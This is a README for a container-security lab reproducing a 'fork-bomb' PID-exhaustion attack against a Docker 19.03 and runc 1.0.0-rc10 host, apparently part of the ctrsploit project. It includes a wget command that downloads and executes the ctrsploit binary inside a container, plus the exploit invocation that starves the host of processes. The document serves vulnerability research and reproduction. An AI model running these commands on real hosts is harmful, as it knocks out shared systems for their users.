# fork-bomb

| Type | Image | Notes |
| ---- | ----- | ----- |
| dqd | ghcr.io/ctrsploit/fork-bomb:latest | points to `v0.1.0` |
| dqd | ghcr.io/ctrsploit/fork-bomb:v0.1.0 | migrate from docker_archive |
| dqd | ssst0n3/docker_archive:fork-bomb_v0.1.0 | - |
| ctr | ghcr.io/ctrsploit/fork-bomb:ctr_v0.1.0 | - |
| ctr | ssst0n3/docker_archive:ctr_fork-bomb_v0.1.0 | - |

## usage

### Start and connect

```shell
$ dqd up vul/fork-bomb
$ ssh dqd-fork-bomb
```

Fallback without dqd CLI or SSH config:

```shell
$ cd vul/fork-bomb
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
$ ./ssh
```

### reproduce

terminal 1

```shell
root@fork-bomb:~# while true; do cat /proc/sys/kernel/ns_last_pid && sleep 1; done
547
548
549
...
```

terminal 2

```shell
root@fork-bomb:~# docker run -ti busybox ash
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul fork-bomb c
[Y]  fork-bomb

/ # ctrsploit vul fork-bomb x

```

terminal 1

```shell
642
644
646
648
8607
-bash: fork: retry: Resource temporarily unavailable
-bash: fork: retry: Resource temporarily unavailable
```

### versions

```shell
root@fork-bomb:~# docker version
Client: Docker Engine - Community
 Version:           19.03.13
 API version:       1.40
 Go version:        go1.13.15
 Git commit:        4484c46d9d
 Built:             Wed Sep 16 17:02:52 2020
 OS/Arch:           linux/amd64
 Experimental:     false

Server: Docker Engine - Community
 Engine:
  Version:          19.03.13
  API version:       1.40 (minimum version 1.12)
  Go version:        go1.13.15
  Git commit:        4484c46d9d
  Built:             Wed Sep 16 17:01:20 2020
  OS/Arch:           linux/amd64
  Experimental:     false
 containerd:
  Version:          1.3.7
  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175
 runc:
  Version:          1.0.0-rc10
  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
root@fork-bomb:~# cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-of-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
root@fork-bomb:~# uname -a
Linux fork-bomb 5.4.0-216-generic #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

## build

```shell
make all ENV=vul/fork-bomb
```

for developers:

```dockerfile
FROM ghcr.io/ctrsploit/fork-bomb:ctr_v0.1.0
```
